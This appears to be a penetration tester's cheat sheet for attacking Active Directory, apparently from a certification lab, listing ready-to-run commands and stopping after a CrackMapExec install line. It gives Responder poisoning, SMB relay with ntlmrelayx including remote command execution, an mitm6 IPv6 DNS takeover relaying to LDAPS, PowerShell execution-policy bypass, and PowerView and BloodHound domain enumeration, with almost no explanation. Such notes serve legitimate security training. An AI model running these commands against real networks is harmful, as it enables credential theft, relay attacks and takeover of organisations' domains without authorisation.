# Attacking Active Directory

## Intitial Access Vectors

### Responder

```
responder -I eth0 -rdwv
```

### Discover SMB Signing disabled

```
nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
```

### SMB Relay Attack


```
sudo ./ntlmrelayx.py -tf /home/kali/pnpt/targets.txt -smb2support
```

```
sudo ./ntlmrelayx.py -tf /home/kali/pnpt/targets.txt -smb2support -i
```

```
sudo ./ntlmrelayx.py -tf /home/kali/pnpt/targets.txt -smb2support -c "whoami"
```

### Iv6 DNS Takeover via mitm6

```
mitm6 -d joker.local
```

```
ntlmrelayx.py -6 -t ldaps://<domain-controller-ip> -wh fake fakewpad.joker.local -l lootme
```

## Post-Compromise Enumeration

### Powerview

Load up PowerView
```
powershell -ep bypass 
.\PowerView.ps1
```

Get information about the Domain
```
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy
(Get-DomainPolicy)."system access"
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select samaccountname
Get-NetUser | select description
Get-UserProperty
Get-UserProperty - Properties pwdlastset
Get-UserProperty - Properties logoncount
Get-UserProperty - Properties badpwdcount
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -FullData | select OperatingSystem
Get-NetGroup
Get-NetGroup -GroupName "Domain Admins"
Get-NetGroup -GroupName "admins"
Get-NetGroupMember -GroupName "Domain Admins"
Invoke-ShareFinder
Get-NetGPO
Get-NetGPO | select dsiplayname, whenchanged
```

### BloodHound

Install BloodHound
```
apt install bloodhound
```

Set up neo4j
```
neo4j console
```

Load up SharpHound
```
powershell -ep bypass 
.\SharpHound.ps1
```

Invoke-BloodHound
```
Invoke-BloodHound -CollectionMethod All -Domain JOKER.local -ZipFileName file.zip
```

## Post-Compromise Attacks

### CrackMapExec

```
sudo apt install crackmapexec
```
